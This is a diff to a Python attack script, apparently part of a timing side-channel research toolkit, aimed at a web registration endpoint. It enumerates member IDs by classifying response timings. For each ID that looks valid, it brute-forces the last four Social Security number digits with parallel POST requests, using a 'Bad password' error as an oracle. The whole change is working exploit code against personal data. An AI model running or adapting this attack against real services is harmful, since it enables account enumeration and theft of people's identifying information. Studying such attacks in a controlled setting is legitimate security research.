@@ -42,6 +42,8 @@ parser.add_argument('host', default=None,
                     help='IP address or host name of server')
 parser.add_argument('port', nargs='?', type=int, default=8080,
                     help='TCP port number of HTTP service (default: 8080)')
+parser.add_argument('guess', nargs='?', type=str, default=None,
+                    help='Retry a member_id guess')
 options = parser.parse_args()
 
 
@@ -74,14 +76,12 @@ def sendRequest(data=None):
         try:
             session = requests.Session()
             response = session.send(req, verify=False)
-            #print(repr(response.raw._original_response.local_address))
             reported = extractReportedRuntime(response.headers, response.text)
             retry = False
         except Exception as e:
             sys.stderr.write("ERROR: HTTP request problem: %s\n" % repr(e))
             time.sleep(1.0)
             sys.stderr.write("ERROR: retrying...\n")
-        #print(data.encode('utf-8'), reported)
         
     return {'userspace_rtt':response.elapsed.microseconds*1000,
             'reported':reported,
@@ -102,26 +102,63 @@ def findMaxSampleID(db):
     return cursor.fetchone()[0]
 
 
+def guessSSN(member_id, last_four):
+    method = 'POST'
+    path = '/jregistrate/register'
+    url = "%s://%s:%d%s" % (protocol,hostname,port,path)
+    headers = {"Content-Type":"application/x-www-form-urlencoded"}
+    body = (b'member_id='+member_id.encode('utf-8')+b'&last_four='+last_four.encode('utf-8')+b'&username=bob&password=1234&conf_pwd=4321')
+    req = requests.Request(method, url, headers=headers, data=body).prepare()
+    session = requests.Session()
+    response = session.send(req, verify=False)
+
+    if 'Bad password' in response.text:
+        return True
+    else:
+        return False
+    
+
+def bruteSSN(member_id):
+    from nanownlib.parallel import WorkerThreads
+    wt = WorkerThreads(4, guessSSN)
+    
+    for last_four in range(9999):
+        ssn = "%4d" % last_four
+        wt.addJob(ssn, (member_id,ssn))
+
+    for i in range(9999):
+        ssn,success = wt.resultq.get()
+        if success:
+            wt.stop()
+            return ssn
+
+    wt.stop()
+    return None
+
+
 setCPUAffinity()
 setTCPTimestamps()
 host_ip = socket.gethostbyname(hostname) #XXX: what about multiple A records?
 db = nanownlib.storage.db(options.session_data)
 
 cases = {"invalid":"0012-9999"}
-guesses = [("0012-%d"%id) for id in range(0,9999) if id != 2019]
+guesses = [("0012-%04d"%id) for id in range(0,9999) if id != 2019]
 random.shuffle(guesses)
-num_observations = 100
+num_observations = 250
 trim = (0,0)
-classifier = "septasummary"
-params = {"distance": 25, "threshold": 40094.274}
+classifier = "quadsummary"
+params = {"distance": 5, "threshold": 18761.53575}
 classifierTest = functools.partial(classifiers[classifier]['test'], params, True)
 
+if options.guess != None:
+    guesses = [options.guess]
 
 sid = findMaxSampleID(db) + 1
 for guess in guesses:
     print("Collecting samples for:", guess)
+    start = time.time()
     cases["valid"] = guess
-    stype = "attack_%s" % guess
+    stype = "attack_%s_%d" % (guess, int(time.time()*1000))
     sample_order = list(cases.items())
 
     sniffer_fp = tempfile.NamedTemporaryFile('w+t')
@@ -146,33 +183,14 @@ for guess in guesses:
     associatePackets(sniffer_fp, db)
     sniffer_fp.close()
     num_probes = analyzeProbes(db, trim=trim)
-    print("num_probes: ", num_probes)
 
     if classifierTest(db.subseries(stype, "valid")):
-        print("Found valid member_id: ", guess)
-        break
-
-
-def guessSSN(member_id, last_four):
-    method = 'POST'
-    path = '/jregistrate/register'
-    url = "%s://%s:%d%s" % (protocol,hostname,port,path)
-    headers = {"Content-Type":"application/x-www-form-urlencoded"}
-    body = (b'member_id='+member_id.encode('utf-8')+b'&last_four='+last_four.encode('utf-8')+b'&username=bob&password=1234&conf_pwd=4321')
-    req = requests.Request(method, url, headers=headers, data=body).prepare()
-    session = requests.Session()
-    response = session.send(req, verify=False)
-
-    if 'Bad password' in response.text:
-        return True
+        print("  Looks valid...")
+        ssn = bruteSSN(guess)
+        if ssn == None:
+            print("  Hmm, didn't find an SSN... ")
+        else:
+            print("  W00t! Found SSN: %s" % ssn)
     else:
-        return False
-
-    
-print(guessSSN('0012-5969', '4298'))
-sys.exit(0)
-
-for last_four in range(9999):
-    if guessSSN(guess, "%4d" % last_four):
-        print("Found valid SSN last four digits:", last_four)
-        break
+        print("  Looks invalid")
+    print("  Runtime: ", time.time()-start)
